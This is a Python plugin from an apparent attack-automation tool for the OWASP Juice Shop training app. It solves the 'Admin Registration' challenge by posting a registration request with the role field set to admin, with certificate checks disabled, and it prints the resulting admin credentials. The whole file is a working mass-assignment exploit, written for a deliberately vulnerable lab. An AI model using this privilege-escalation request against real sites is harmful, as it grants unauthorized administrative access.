# SOURCE FILE:    admin_registration.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve ADMIN REGISTRATION Challenge
#                 Register a new user with admin role (by changing the role from customer to admin)
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------
import logging
import time
from plugins import attack as a
from plugins import user_generate as usrGen
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#---------------------------------------------------------------------------------------
#Class: admin_registration
#Inherit: Attack
#----------------------------------------------------------------------------------------
class admin_registration(a.attack_inter):

#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()
        # url to registrate a new user
        self.url = a.URL + '/api/Users'
        # moke password
        self.password = '123456'
        # class used to generate a new user email
        usr = usrGen.new_user_generate()
        # new user email
        self.email = usr.generate_email()

#-----------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def generator(self):
        json_data = {
            'email': self.email,
            'password': self.password,
            'passwordRepeat': '123456',
            'role':'admin',
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }
        return json_data

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        print("================Start register a new admin user==============")
        logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Admin Registration")
        a.logging.info(logger)
        a.logging.info('Started')
        json_data = self.generator()
        response = a.requests.post(self.url, json=json_data, verify=False)
        print(response.status_code)
        ## load cookie
        if response.status_code == 201:
            res_payload_dict = response.json()
            print("response begin")
            print(response.text)
            print("response end")
            print("Congratulations! You have successfully solve a challenge Admin Registration")
            print("Now you can login with admin email " + self.email +" and password " + self.password)
            userid = response.json()["data"]["id"]
            a.logging.info('Finished')
            print("================registration finished==============")
            return self.email, self.password, userid
            


